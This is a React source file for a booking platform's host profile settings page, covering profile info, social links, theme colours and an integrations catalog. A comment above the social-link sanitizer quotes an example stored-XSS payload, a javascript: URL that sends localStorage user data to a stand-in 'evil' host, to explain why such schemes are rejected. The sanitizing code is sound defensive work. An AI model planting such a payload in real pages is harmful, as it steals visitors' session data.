import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "../context/AuthContext";
import { updateProfile, uploadImage, getAppearance } from "../services/api";
import BackButton from "../components/common/BackButton";
import BackgroundPicker from "../components/BackgroundPicker";
import ImageCropper from "../components/common/ImageCropper";
import FeatureGate from "../components/common/FeatureGate";
import UsernameField from "../components/dashboard/UsernameField";
import CategoriesSection from "../components/dashboard/CategoriesSection";
import toast from "react-hot-toast";
import {
  getColorsForPlan,
  canUseCustomHex,
  getContrastColor,
  getPlanBorderColor,
  DEFAULT_THEME_COLOR,
  isValidHex,
  FREE_COLORS,
  CREATOR_COLORS,
} from "../utils/themeUtils";
import {
  PageHeader, Card, Button, FormField, Input, Select, Textarea, cn,
} from "../components/dashboard/ui";

// ─── Minimal plan label for display ─────────────────────────────────────────
const PLAN_LABEL = { starter: 'Starter', explorer: 'Starter', creator: 'Host+', professional: 'Studio', supreme: 'Supreme' };

// ─── Social platform config ──────────────────────────────────────────────────
const SOCIAL_PLATFORMS = [
  { key: 'instagram', label: 'Instagram',  placeholder: 'https://instagram.com/yourhandle', type: 'url' },
  { key: 'youtube',   label: 'YouTube',    placeholder: 'https://youtube.com/@yourchannel', type: 'url' },
  { key: 'linkedin',  label: 'LinkedIn',   placeholder: 'https://linkedin.com/in/you',      type: 'url' },
  { key: 'facebook',  label: 'Facebook',   placeholder: 'https://facebook.com/yourpage',    type: 'url' },
  { key: 'twitter',   label: 'X (Twitter)',placeholder: 'https://x.com/yourhandle',         type: 'url' },
  { key: 'whatsapp',  label: 'WhatsApp',   placeholder: 'https://wa.me/919876543210',       type: 'url' },
  { key: 'website',   label: 'Website',    placeholder: 'https://yourwebsite.com',           type: 'url' },
  { key: 'github',    label: 'GitHub',     placeholder: 'https://github.com/you',            type: 'url' },
  { key: 'email',     label: 'Public Email',placeholder: 'hello@you.com',                   type: 'email' },
];

// ─── Integrations catalog ─────────────────────────────────────────────────────
// Google Calendar is wired (its own card above). These are the rest of the
// catalog, shown as branded favicon cards (real brand marks via Google's
// favicon service, no emoji). Marked "Coming soon" until each is wired up.
const MORE_INTEGRATIONS = [
  { name: 'Google Meet',          domain: 'meet.google.com',      desc: 'Video links on online bookings' },
  { name: 'Zoom',                 domain: 'zoom.us',              desc: 'Auto-create Zoom meeting links' },
  { name: 'Microsoft Teams',      domain: 'teams.microsoft.com',  desc: 'Teams links for bookings' },
  { name: 'Calendly',             domain: 'calendly.com',         desc: 'Import external availability' },
  { name: 'Stripe',               domain: 'stripe.com',           desc: 'Accept card payments' },
  { name: 'Razorpay',             domain: 'razorpay.com',         desc: 'Payments & instant payouts' },
  { name: 'PayPal',               domain: 'paypal.com',           desc: 'Accept PayPal payments' },
  { name: 'Cashfree',             domain: 'cashfree.com',         desc: 'Payments & payouts (India)' },
  { name: 'Zoho CRM',             domain: 'zoho.com',             desc: 'Sync contacts to Zoho CRM' },
  { name: 'HubSpot',              domain: 'hubspot.com',          desc: 'Push leads to HubSpot' },
  { name: 'Slack',                domain: 'slack.com',            desc: 'Booking alerts in Slack' },
  { name: 'Notion',               domain: 'notion.so',            desc: 'Log bookings to Notion' },
  { name: 'Airtable',             domain: 'airtable.com',         desc: 'Sync bookings to Airtable' },
  { name: 'WhatsApp Business',    domain: 'whatsapp.com',         desc: 'Reminders via WhatsApp' },
  { name: 'Mailchimp',            domain: 'mailchimp.com',        desc: 'Add guests to email lists' },
  { name: 'Brevo',                domain: 'brevo.com',            desc: 'Email & SMS campaigns' },
  { name: 'Meta Pixel',           domain: 'facebook.com',         desc: 'Track ad conversions' },
  { name: 'Google Analytics',     domain: 'analytics.google.com', desc: 'Measure your traffic' },
  { name: 'Google Tag Manager',   domain: 'tagmanager.google.com',desc: 'Manage marketing tags' },
  { name: 'Google Search Console',domain: 'search.google.com',    desc: 'Track search performance' },
  { name: 'Zapier',               domain: 'zapier.com',           desc: 'Connect 6,000+ apps' },
  { name: 'Webhooks',             domain: '',                     desc: 'Send events to your endpoint' },
];

// Brand favicon with a graceful initial-letter fallback (no emoji).
const Favicon = ({ domain, name }) => {
  const [err, setErr] = useState(false);
  if (err || !domain) {
    return (
      <div className="grid h-9 w-9 shrink-0 place-items-center rounded-lg border border-gray-100 bg-gray-50 text-xs font-bold text-gray-400">
        {name.charAt(0).toUpperCase()}
      </div>
    );
  }
  return (
    <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg border border-gray-100 bg-white">
      <img
        src={`https://www.google.com/s2/favicons?domain=${domain}&sz=64`}
        alt=""
        width="20"
        height="20"
        loading="lazy"
        className="h-5 w-5 object-contain"
        onError={() => setErr(true)}
      />
    </div>
  );
};

// ─── Social link sanitizer ───────────────────────────────────────────────────
// social_links are rendered as href on the public profile/service pages, so an
// unvalidated value like `javascript:fetch('//evil/?c='+localStorage.user)` is
// stored XSS. Never persist a non-http(s) scheme. Keep only: empty (cleared),
// a valid email (email field), or an http(s) URL. Bare domains are normalised
// to https:// to match the "full URL" UX the placeholders imply.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
const sanitizeSocialLinks = (links = {}) => {
  const out = {};
  for (const { key, type } of SOCIAL_PLATFORMS) {
    const raw = String(links[key] ?? '').trim();
    if (!raw) { out[key] = ''; continue; }
    if (type === 'email') {
      out[key] = EMAIL_RE.test(raw) ? raw : '';
      continue;
    }
    if (/^https?:\/\//i.test(raw)) {
      out[key] = raw;
    } else if (/^[a-z][a-z0-9+.-]*:/i.test(raw)) {
      // Some other scheme (javascript:, data:, mailto:, …) — reject outright.
      out[key] = '';
    } else {
      // Bare domain / path → assume https.
      out[key] = `https://${raw}`;
    }
  }
  return out;
};

// ─── Color Swatch ────────────────────────────────────────────────────────────
const Swatch = ({ color, selected, onClick }) => (
  <button
    type="button"
    onClick={() => onClick(color.hex)}
    title={color.name}
    className="relative h-8 w-8 rounded-lg border-2 transition-transform hover:scale-110 focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-offset-1"
    style={{
      backgroundColor: color.hex,
      borderColor: selected ? '#111827' : 'transparent',
      boxShadow: selected ? '0 0 0 2px #111827' : 'inset 0 0 0 1px rgba(0,0,0,0.1)',
    }}
  >
    {selected && (
      <span className="absolute inset-0 flex items-center justify-center">
        <svg style={{ color: getContrastColor(color.hex) }} className="h-3.5 w-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
        </svg>
      </span>
    )}
  </button>
);

// ─── Mini Profile Preview ────────────────────────────────────────────────────
const ProfilePreview = ({ form, themeColor }) => {
  const tc = isValidHex(themeColor) ? themeColor : DEFAULT_THEME_COLOR;
  const textOnTheme = getContrastColor(tc);
  const borderColor = getPlanBorderColor('explorer'); // preview always uses explorer

  return (
    <div className="mx-auto w-full max-w-[240px] select-none overflow-hidden rounded-2xl border bg-white text-xs shadow-sm">
      {/* Cover */}
      <div className="relative h-16" style={{ background: form.cover_image ? undefined : `linear-gradient(135deg, ${tc}33, ${tc}88)` }}>
        {form.cover_image && <img src={form.cover_image} alt="" className="h-full w-full object-cover" />}
      </div>
      {/* Avatar — relative+z-10 so it paints above the positioned cover (else cover overlaps photo) */}
      <div className="relative z-10 -mt-7 flex justify-center">
        <div className="h-14 w-14 flex-shrink-0 overflow-hidden rounded-xl border-2 bg-gray-100" style={{ borderColor }}>
          {form.profile_image
            ? <img src={form.profile_image} alt="" className="h-full w-full object-cover" />
            : <div className="flex h-full w-full items-center justify-center text-lg font-bold text-gray-400">{form.name?.charAt(0)?.toUpperCase() || '?'}</div>}
        </div>
      </div>
      {/* Info */}
      <div className="px-3 pb-3 pt-1.5 text-center">
        <p className="truncate font-bold text-gray-900">{form.name || 'Your Name'}</p>
        {(form.profession || form.tagline) && (
          <p className="mt-0.5 truncate text-[10px] font-medium" style={{ color: tc }}>{form.profession || form.tagline}</p>
        )}
        {form.bio && <p className="mt-1 line-clamp-2 text-[10px] leading-relaxed text-gray-400">{form.bio}</p>}
        {/* CTA Preview */}
        <div className="mt-3 rounded-lg px-3 py-1.5 text-[10px] font-bold" style={{ background: tc, color: textOnTheme }}>Book a Session</div>
      </div>
    </div>
  );
};

// ─── Main Component ───────────────────────────────────────────────────────────

const ProfileSetup = () => {
  const { user, updateUser } = useAuth();
  const navigate = useNavigate();
  const [cropper, setCropper] = useState(null);
  const [coverUploading, setCoverUploading] = useState(false);
  const coverInputRef = useRef(null);
  const [dirty, setDirty] = useState(false);
  const [activeSection, setActiveSection] = useState('info'); // 'info' | 'social' | 'appearance' | 'integrations'

  const plan = user?.plan || 'explorer';
  const availableColors = getColorsForPlan(plan);
  const customHexAllowed = canUseCustomHex(plan);

  const [form, setForm] = useState({
    name: "",
    username: "",
    bio: "",
    tagline: "",
    profession: "",
    profile_image: "",
    cover_image: "",
    location: "",
    theme_color: DEFAULT_THEME_COLOR,
    reschedule_fee: 0,
    social_links: {
      instagram: "", youtube: "", linkedin: "", facebook: "",
      twitter: "", whatsapp: "", website: "", github: "", email: "",
    },
  });
  const [customHex, setCustomHex] = useState('');
  const [loading, setLoading] = useState(false);
  const [backgroundKey, setBackgroundKey] = useState(null);
  const [enabledBackgrounds, setEnabledBackgrounds] = useState([]);

  // Enabled background types come from the public appearance config (enabled-only array).
  useEffect(() => {
    let alive = true;
    getAppearance()
      .then(({ data }) => {
        const bgs = data?.backgrounds || [];
        if (alive && bgs.length) setEnabledBackgrounds(bgs);
      })
      .catch(() => {});
    return () => { alive = false; };
  }, []);

  useEffect(() => {
    if (user) {
      const sl = user.social_links || {};
      setForm({
        name:           user.name || "",
        username:       user.username || "",
        bio:            user.bio || "",
        tagline:        user.tagline || "",
        profession:     user.profession || "",
        profile_image:  user.profile_image || "",
        cover_image:    user.cover_image || "",
        location:       user.location || "",
        theme_color:    user.theme_color || DEFAULT_THEME_COLOR,
        reschedule_fee: Number(user.reschedule_fee ?? 0),
        social_links: {
          instagram: sl.instagram || "",
          youtube:   sl.youtube   || "",
          linkedin:  sl.linkedin  || "",
          facebook:  sl.facebook  || "",
          twitter:   sl.twitter   || "",
          whatsapp:  sl.whatsapp  || "",
          website:   sl.website   || "",
          github:    sl.github    || "",
          email:     sl.email     || "",
        },
      });
      if (user.theme_color) setCustomHex(user.theme_color);
      setBackgroundKey(user.background_key || null);
    }
  }, [user]);

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
    setDirty(true);
  };
  const handleSocialChange = (e) => {
    setForm({ ...form, social_links: { ...form.social_links, [e.target.name]: e.target.value } });
    setDirty(true);
  };
  const handleColorSelect = (hex) => {
    setForm(f => ({ ...f, theme_color: hex }));
    setDirty(true);
  };
  const handleCustomHex = (e) => {
    const v = e.target.value;
    setCustomHex(v);
    if (isValidHex(v)) {
      setForm(f => ({ ...f, theme_color: v }));
      setDirty(true);
    }
  };

  // Cover photo: plain upload — no crop/zoom/rotate. The image renders with
  // object-fit: cover everywhere, so editing UI is unnecessary complexity.
  const handleCoverFile = async (e) => {
    const file = e.target.files?.[0];
    e.target.value = ""; // allow re-selecting the same file
    if (!file) return;
    if (!["image/jpeg", "image/jpg", "image/png", "image/webp"].includes(file.type)) {
      toast.error("Use a JPG, PNG or WebP image");
      return;
    }
    if (file.size > 2 * 1024 * 1024) {
      toast.error("Image must be under 2MB");
      return;
    }
    setCoverUploading(true);
    try {
      const fd = new FormData();
      fd.append("image", file);
      const { data } = await uploadImage(fd, "covers");
      setForm(f => ({ ...f, cover_image: data.url }));
      setDirty(true);
    } catch (err) {
      toast.error(err.response?.data?.message || "Cover upload failed");
    } finally {
      setCoverUploading(false);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      // Strip any non-http(s) scheme (javascript:, data:, …) before persisting —
      // these values render as href on public pages and would be stored XSS.
      const payload = { ...form, background_key: backgroundKey, social_links: sanitizeSocialLinks(form.social_links) };
      const { data } = await updateProfile(payload);
      updateUser({ ...data, token: user.token, refresh_token: user.refresh_token });
      toast.success("Profile saved!");
      setDirty(false);
      navigate("/dashboard");
    } catch (err) {
      toast.error(err.response?.data?.message || "Failed to save profile");
    } finally {
      setLoading(false);
    }
  };

  const tc = isValidHex(form.theme_color) ? form.theme_color : DEFAULT_THEME_COLOR;

  // ── Section tab helper ── (plain <button> so role="button" queries resolve)
  const Tab = ({ id, label }) => (
    <button
      type="button"
      onClick={() => setActiveSection(id)}
      className={cn(
        'relative whitespace-nowrap px-1 pb-3 text-sm font-medium transition-colors',
        activeSection === id ? 'text-primary' : 'text-gray-500 hover:text-gray-800',
      )}
    >
      {label}
      {activeSection === id && <span className="absolute inset-x-0 -bottom-px h-0.5 rounded-full bg-primary" />}
    </button>
  );

  return (
    <div className="mx-auto max-w-5xl">
      <BackButton hasUnsavedChanges={dirty} />
      <PageHeader
        title="Host Profile"
        subtitle={<>How guests discover and book you. Plan: <span className="font-semibold text-gray-700">{PLAN_LABEL[plan]}</span></>}
      />

      {/* Section tabs */}
      <div className="dash-noscrollbar mb-6 flex flex-wrap gap-5 overflow-x-auto border-b border-gray-200">
        <Tab id="info"         label="Profile Info" />
        <Tab id="categories"   label="Categories" />
        <Tab id="social"       label="Social Links" />
        <Tab id="appearance"   label="Appearance" />
        <Tab id="integrations" label="Integrations" />
        {/* Plan lives on its own page; this tab just links out. */}
        <button
          type="button"
          onClick={() => navigate('/dashboard/upgrade')}
          className="relative whitespace-nowrap px-1 pb-3 text-sm font-medium text-gray-500 transition-colors hover:text-gray-800"
        >
          Plan
        </button>
      </div>

      <form onSubmit={handleSubmit}>
        {/* ── SECTION: Profile Info ── */}
        {activeSection === 'info' && (
          <div className="space-y-5">
            {/* Images */}
            {cropper === "profile" && (
              <ImageCropper aspect={1} folder="profiles" currentUrl={form.profile_image}
                onUploaded={(url) => { setForm(f => ({ ...f, profile_image: url })); setDirty(true); setCropper(null); }}
                onClose={() => setCropper(null)} label="Profile Photo" />
            )}
            {/* Cover photo uses a plain file input — no editor */}
            <input ref={coverInputRef} type="file" accept="image/jpeg,image/png,image/webp" className="hidden" onChange={handleCoverFile} />

            <div className="grid grid-cols-1 gap-4 md:grid-cols-2">
              <div>
                <label className="mb-1 block text-sm font-medium text-gray-700">Profile Photo</label>
                <div className="flex items-center gap-3">
                  <div
                    className="h-16 w-16 flex-shrink-0 cursor-pointer overflow-hidden rounded-xl border-2 bg-gray-50 transition-opacity hover:opacity-80"
                    style={{ borderColor: getPlanBorderColor(plan) }}
                    onClick={() => setCropper("profile")}
                  >
                    {form.profile_image
                      ? <img src={form.profile_image} alt="" className="h-full w-full object-cover" />
                      : <svg className="m-5 h-6 w-6 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>}
                  </div>
                  <div>
                    <Button type="button" variant="outline" size="sm" onClick={() => setCropper("profile")}>
                      {form.profile_image ? "Change photo" : "Upload photo"}
                    </Button>
                    <p className="mt-1 text-[10px] text-gray-400">Border colour reflects your plan tier</p>
                  </div>
                </div>
              </div>
              <FeatureGate flag="cover_photo">
                <div>
                  <label className="mb-1 block text-sm font-medium text-gray-700">Cover Photo</label>
                  <div
                    className="relative h-16 cursor-pointer overflow-hidden rounded-xl border bg-gray-50 transition-opacity hover:opacity-80"
                    onClick={() => !coverUploading && coverInputRef.current?.click()}
                  >
                    {coverUploading
                      ? <div className="flex h-full items-center justify-center text-xs text-gray-400">Uploading…</div>
                      : form.cover_image
                        ? <img src={form.cover_image} alt="" className="h-full w-full object-cover" />
                        : <div className="flex h-full items-center justify-center text-xs text-gray-400">Click to upload cover photo</div>}
                  </div>
                  <p className="mt-1 text-[10px] text-gray-400">JPG/PNG/WebP up to 2MB — shown full-width, auto-cropped to fit</p>
                </div>
              </FeatureGate>
            </div>

            <div className="grid grid-cols-1 gap-4 md:grid-cols-2">
              <FormField label="Host Name" htmlFor="ps-name" className="mb-0">
                <Input id="ps-name" type="text" name="name" required value={form.name} onChange={handleChange} />
              </FormField>
              <UsernameField user={user} onChanged={(u) => updateUser({ ...user, username: u })} />
            </div>

            <div className="grid grid-cols-1 gap-4 md:grid-cols-2">
              <FormField label="Host Title" className="mb-0">
                <Input type="text" name="profession" placeholder="e.g. Founder and Developer" value={form.profession} onChange={handleChange} />
              </FormField>
              <FormField label="Location" className="mb-0">
                <Input type="text" name="location" placeholder="e.g. Nagpur, Maharashtra" value={form.location} onChange={handleChange} />
              </FormField>
            </div>

            <FormField label="Tagline" className="mb-0">
              <Input type="text" name="tagline" placeholder="Short one-liner about you" value={form.tagline} onChange={handleChange} maxLength={100} />
            </FormField>

            <FormField label={<>Bio <span className="text-gray-400">({form.bio.length}/500)</span></>} className="mb-0">
              <Textarea name="bio" rows={4} placeholder="Tell people about yourself..." value={form.bio} onChange={handleChange} maxLength={500} />
            </FormField>
          </div>
        )}

        {/* ── SECTION: Categories ── */}
        {activeSection === 'categories' && (
          <CategoriesSection
            plan={plan}
            onSaved={(data) => updateUser({ ...user, primary_category: data.primary_category, categories: data.categories })}
          />
        )}

        {/* ── SECTION: Social Links ── */}
        {activeSection === 'social' && (
          <FeatureGate flag="social_links" fallback={<p className="text-sm text-gray-400">Social links are currently disabled.</p>}>
            <div className="space-y-4">
              <p className="text-sm text-gray-500">Add your social profiles. Only filled links appear on your public page.</p>
              <div className="grid grid-cols-1 gap-3 md:grid-cols-2">
                {SOCIAL_PLATFORMS.map(({ key, label, placeholder, type }) => (
                  <FormField key={key} label={label} htmlFor={`sl-${key}`} className="mb-0">
                    <Input id={`sl-${key}`} type={type} name={key} placeholder={placeholder} value={form.social_links[key] || ''} onChange={handleSocialChange} />
                  </FormField>
                ))}
              </div>
            </div>
          </FeatureGate>
        )}

        {/* ── SECTION: Appearance & Branding ── */}
        {activeSection === 'appearance' && (
          <div className="grid grid-cols-1 gap-8 lg:grid-cols-2">
            {/* Left: controls */}
            <div className="space-y-6">
              {/* Theme Color */}
              <FeatureGate flag="theme_colors">
                <div>
                  <div className="mb-3 flex items-center justify-between">
                    <div>
                      <h3 className="text-sm font-semibold text-gray-800">Theme Color</h3>
                      <p className="mt-0.5 text-xs text-gray-400">Applied to buttons, accents, and CTAs on your profile</p>
                    </div>
                    <span className="rounded-full bg-gray-100 px-2 py-0.5 text-[10px] font-medium text-gray-500">{PLAN_LABEL[plan]}</span>
                  </div>

                  {/* Swatches */}
                  <div className="mb-3 flex flex-wrap gap-2">
                    {availableColors.map(color => (
                      <Swatch key={color.hex} color={color} selected={form.theme_color === color.hex} onClick={handleColorSelect} />
                    ))}
                  </div>

                  {/* Pro custom hex */}
                  {customHexAllowed ? (
                    <FeatureGate flag="custom_hex_color">
                      <div className="mt-2 flex items-center gap-2">
                        <div className="h-8 w-8 flex-shrink-0 rounded-lg border" style={{ background: isValidHex(customHex) ? customHex : '#e5e7eb' }} />
                        <Input type="text" placeholder="#4F46E5" maxLength={7} className="flex-1 font-mono" value={customHex} onChange={handleCustomHex} />
                        <span className="text-xs text-gray-400">Custom</span>
                      </div>
                    </FeatureGate>
                  ) : (
                    <p className="mt-1 text-xs text-gray-400">
                      {plan === 'creator' ? '16 colours available. Upgrade to Studio for the full palette + custom hex.' : 'Starter uses the brand colour. Upgrade to Host+ for 16 colours.'}
                    </p>
                  )}
                </div>
              </FeatureGate>

              {/* Page background */}
              <div>
                <h3 className="mb-1 text-sm font-semibold text-gray-800">Page background</h3>
                <p className="mb-3 text-xs text-gray-400">Animated backdrop shown at the top of your service pages, in your brand colour.</p>
                <BackgroundPicker
                  color={tc}
                  enabled={enabledBackgrounds}
                  value={backgroundKey}
                  onChange={(k) => { setBackgroundKey(k); setDirty(true); }}
                />
              </div>

              {/* Profile Border Info */}
              <div className="rounded-xl bg-gray-50 p-4">
                <h3 className="mb-1 text-sm font-semibold text-gray-800">Profile Photo Border</h3>
                <div className="mt-2 flex items-center gap-3">
                  <div className="h-10 w-10 flex-shrink-0 rounded-xl border-2 bg-white" style={{ borderColor: getPlanBorderColor(plan) }} />
                  <div>
                    <p className="text-xs text-gray-600">
                      Your border is <span className="font-semibold" style={{ color: getPlanBorderColor(plan) }}>
                        {plan === 'supreme' ? 'Gold (Supreme)' : plan === 'professional' ? 'Gold (Studio)' : plan === 'creator' ? 'Orange (Host+)' : 'Grey (Starter)'}
                      </span>
                    </p>
                    <p className="mt-0.5 text-[10px] text-gray-400">Border updates automatically with your plan tier</p>
                  </div>
                </div>
              </div>

              {/* Upcoming Features */}
              <div className="rounded-xl border border-amber-200 bg-amber-50 p-4">
                <h3 className="mb-1 text-sm font-semibold text-amber-800">Coming Soon</h3>
                <ul className="space-y-0.5 text-xs text-amber-700">
                  <li>• Gradient backgrounds</li>
                  <li>• Custom font selection</li>
                  <li>• Theme packs &amp; presets</li>
                  <li>• Dark mode profile</li>
                </ul>
              </div>
            </div>

            {/* Right: live preview */}
            <div>
              <h3 className="mb-3 text-sm font-semibold text-gray-800">Live Preview</h3>
              <ProfilePreview form={form} themeColor={tc} />
              <p className="mt-3 text-center text-xs text-gray-400">Updates as you type</p>

              {/* Booking CTA preview */}
              <Card className="mt-5">
                <p className="mb-2 text-xs font-medium text-gray-400">Booking Button Preview</p>
                <button type="button" className="w-full rounded py-2.5 text-sm font-bold transition-all" style={{ background: tc, color: getContrastColor(tc) }}>
                  Book a Session
                </button>
                <p className="mt-2 text-center text-[10px] text-gray-400">Text auto-adjusts for readability (WCAG AA)</p>
              </Card>
            </div>
          </div>
        )}

        {/* ── SECTION: Integrations ── */}
        {activeSection === 'integrations' && (
          <div className="space-y-5">
            {/* Google Calendar */}
            <FeatureGate flag="google_calendar">
              <Card padded={false} className="p-5">
                <div className="flex items-start justify-between gap-4">
                  <div className="flex items-start gap-3">
                    {/* Google icon */}
                    <div className="flex h-10 w-10 flex-shrink-0 items-center justify-center rounded-xl border bg-gray-50">
                      <svg className="h-5 w-5" viewBox="0 0 24 24">
                        <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                        <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                        <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                        <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                      </svg>
                    </div>
                    <div>
                      <h3 className="text-sm font-semibold text-gray-900">Google Calendar</h3>
                      <p className="mt-0.5 text-xs text-gray-500">Auto-create Google Meet links for every confirmed online booking.</p>
                      {user?.google_calendar_connected && (
                        <span className="mt-1.5 inline-flex items-center gap-1 rounded-full bg-green-50 px-2 py-0.5 text-[10px] font-semibold text-green-700">
                          <span className="inline-block h-1.5 w-1.5 rounded-full bg-green-500" />
                          Connected
                        </span>
                      )}
                    </div>
                  </div>
                  <button
                    type="button"
                    onClick={() => {
                      if (user?.google_calendar_connected) {
                        toast('To disconnect, contact support or revoke access in your Google account settings.', { icon: 'ℹ️' });
                      } else {
                        import('../services/api').then(({ getGoogleAuthUrl }) =>
                          getGoogleAuthUrl().then(({ data }) => { window.location.href = data.url; })
                        );
                      }
                    }}
                    className={cn(
                      'flex-shrink-0 whitespace-nowrap rounded border px-4 py-2 text-xs font-semibold transition-colors',
                      user?.google_calendar_connected ? 'border-gray-300 text-gray-500 hover:bg-gray-50' : 'border-primary/40 text-primary hover:bg-primary/5',
                    )}
                  >
                    {user?.google_calendar_connected ? 'Connected ✓' : 'Connect'}
                  </button>
                </div>
                <div className="mt-3 space-y-1 border-t pt-3 text-xs text-gray-400">
                  <p>• Works with online services only (not in-person)</p>
                  <p>• Guests receive the Meet link in their confirmation email</p>
                  <p>• Bookings appear on your Google Calendar automatically</p>
                </div>
              </Card>
            </FeatureGate>

            {/* Reschedule fee */}
            <Card padded={false} className="p-5">
              <h3 className="mb-3 text-sm font-semibold text-gray-900">Booking Policy</h3>
              <FormField label="Guest reschedule fee" htmlFor="reschedule_fee" hint="The platform keeps this fee. The guest's first reschedule is always free." className="mb-0">
                <Select
                  id="reschedule_fee"
                  value={form.reschedule_fee ?? 0}
                  onChange={(e) => { setForm({ ...form, reschedule_fee: Number(e.target.value) }); setDirty(true); }}
                >
                  <option value={0}>Free (₹0)</option>
                  <option value={10}>₹10 per reschedule (from the 2nd)</option>
                </Select>
              </FormField>
            </Card>

            {/* More integrations — branded favicon cards, expanded catalog */}
            <div>
              <div className="mb-3 flex items-center justify-between">
                <p className="text-xs font-semibold uppercase tracking-wide text-gray-400">More integrations</p>
                <span className="text-[11px] text-gray-400">{MORE_INTEGRATIONS.length} more</span>
              </div>
              <div className="grid grid-cols-1 gap-3 sm:grid-cols-2 lg:grid-cols-3">
                {MORE_INTEGRATIONS.map((i) => (
                  <div key={i.name} className="flex flex-col rounded-xl border border-gray-100 bg-white p-4 transition-shadow hover:shadow-sm">
                    <div className="flex items-start gap-3">
                      <Favicon domain={i.domain} name={i.name} />
                      <div className="min-w-0 flex-1">
                        <p className="truncate text-sm font-semibold text-gray-900">{i.name}</p>
                        <p className="mt-0.5 text-xs leading-snug text-gray-500">{i.desc}</p>
                      </div>
                    </div>
                    <div className="mt-3 flex items-center border-t border-gray-50 pt-2.5">
                      <span className="inline-flex items-center gap-1 rounded-full bg-gray-100 px-2 py-0.5 text-[10px] font-semibold text-gray-500">
                        <span className="inline-block h-1.5 w-1.5 rounded-full bg-gray-400" />
                        Coming soon
                      </span>
                    </div>
                  </div>
                ))}
              </div>
              <p className="mt-3 text-[11px] text-gray-400">
                More integrations are on the way. Need one sooner? Let us know from the Help page.
              </p>
            </div>
          </div>
        )}

        {/* Save button — always visible */}
        <div className="mt-8 flex gap-3 border-t pt-5">
          <button
            type="submit"
            disabled={loading}
            className="flex-1 rounded py-2.5 text-sm font-semibold text-white transition-colors disabled:opacity-50"
            style={{ background: tc }}
          >
            {loading ? "Saving…" : "Save Profile"}
          </button>
          <Button type="button" variant="outline" onClick={() => navigate("/dashboard")}>Cancel</Button>
        </div>
      </form>
    </div>
  );
};

export default ProfileSetup;
